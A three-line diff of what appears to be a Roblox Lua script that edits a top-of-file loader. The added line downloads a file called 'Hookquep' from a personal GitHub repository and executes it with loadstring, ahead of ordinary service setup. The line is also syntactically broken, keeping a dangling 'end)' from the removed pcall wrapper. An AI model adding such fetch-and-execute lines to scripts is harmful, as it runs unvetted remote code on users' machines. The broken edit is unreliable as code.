@@ -1,4 +1,4 @@
-pcall(function() loadstring(game:HttpGet("https://www.google.com/search?q=https://raw.githubusercontent.com/ccistao/Randomshit/refs/heads/main/Hookquep"))() end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ccistao/Randomshit/refs/heads/main/Hookquep"))() end)
 local Players          = game:GetService("Players")
 local TweenService     = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
